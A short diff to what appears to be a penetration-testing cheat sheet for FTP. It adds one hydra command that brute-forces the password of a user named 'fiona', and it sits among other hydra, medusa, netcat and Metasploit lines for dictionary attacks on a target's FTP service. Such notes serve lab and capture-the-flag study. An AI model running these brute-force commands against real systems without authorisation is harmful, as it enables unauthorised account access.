@@ -24,6 +24,7 @@ nc -nv $target 21
 search auxiliary/scanner/ftp/
 # dictionary attack
 hydra -l usuario -P $rockyou $target ftp
+hydra -l fiona -P $rockyou ftp://$target -u -t 1
 hydra -L users.list -P passwords.list ftp://$target:<port>
 medusa -u usuario -P $rockyou -h $target -M ftp 
 medusa -u usuario -P $rockyou -h $target -M ftp -n <port>
